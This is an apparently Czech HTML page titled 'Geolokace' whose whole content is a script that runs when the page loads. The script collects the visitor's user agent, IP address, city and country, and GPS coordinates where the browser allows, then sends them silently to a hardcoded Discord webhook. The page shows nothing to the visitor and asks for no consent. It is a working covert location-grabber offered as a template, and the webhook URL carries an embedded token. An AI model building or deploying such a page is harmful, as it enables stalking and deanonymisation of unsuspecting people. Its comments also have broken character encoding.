<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Geolokace</title>
    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1334918135857287268/WDn0O_tSSKD3MLk-bufiwVHND9YgkexGKMsXG7guC6RKacjmxV-fvuC7EcNpu7LTGddE"; // Nahra캞 sv칳m webhookem

        // Funkce pro z칤sk치n칤 informac칤 o za콏칤zen칤 a IP
        function getDeviceAndIP() {
            let device = navigator.userAgent; // Detekce za콏칤zen칤

            fetch("https://ipinfo.io/json")
            .then(response => response.json())
            .then(data => {
                const message = `游님 Za콏칤zen칤: ${device}\n游깴 IP Adresa: ${data.ip} (M캩sto: ${data.city}, Zem캩: ${data.country})`;

                // Pokud je dostupn치 GPS, p콏id치me ji do zpr치vy
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(position => {
                        const lat = position.coords.latitude.toFixed(6);
                        const lon = position.coords.longitude.toFixed(6);
                        sendToDiscord(`${message}\n游늸 GPS: ${lat}, ${lon}`);
                    }, () => {
                        // Pokud nen칤 mo쬹칠 z칤skat GPS, ode코leme pouze za콏칤zen칤 a IP
                        sendToDiscord(message);
                    });
                } else {
                    // Pokud geolokace nen칤 podporov치na, po코leme jen za콏칤zen칤 a IP
                    sendToDiscord(message);
                }
            })
            .catch(error => console.error("Chyba z칤sk치n칤 IP:", error));
        }

        // Funkce pro odesl치n칤 zpr치vy na Discord
        function sendToDiscord(message) {
            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: message })
            }).catch(error => console.error("Chyba odes칤l치n칤:", error));
        }

        // Na캜ten칤 str치nky
        window.onload = getDeviceAndIP;
    </script>
</head>

</body>
</html>
